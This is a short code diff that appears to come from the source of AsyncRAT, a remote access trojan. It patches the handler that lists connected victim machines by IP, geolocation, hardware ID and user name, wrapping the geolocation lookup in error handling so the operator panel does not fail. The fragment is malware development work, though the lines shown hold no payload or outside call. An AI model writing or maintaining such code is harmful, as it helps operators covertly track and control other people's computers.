@@ -19,7 +19,12 @@ namespace AsyncRAT_Sharp.Handle_Packet
                         client.LV = new ListViewItem();
                         client.LV.Tag = client;
                         client.LV.Text = string.Format("{0}:{1}", client.ClientSocket.RemoteEndPoint.ToString().Split(':')[0], client.ClientSocket.LocalEndPoint.ToString().Split(':')[1]);
-                        string[] ipinf = new cGeoMain().GetIpInf(client.ClientSocket.RemoteEndPoint.ToString().Split(':')[0]).Split(':');
+                        string[] ipinf;
+                        try
+                        {
+                           ipinf = new cGeoMain().GetIpInf(client.ClientSocket.RemoteEndPoint.ToString().Split(':')[0]).Split(':');
+                        }
+                        catch { ipinf = new string[] { "?", "?" }; }
                         client.LV.SubItems.Add(ipinf[1]);
                         client.LV.SubItems.Add(unpack_msgpack.ForcePathObject("HWID").AsString);
                         client.LV.SubItems.Add(unpack_msgpack.ForcePathObject("User").AsString);
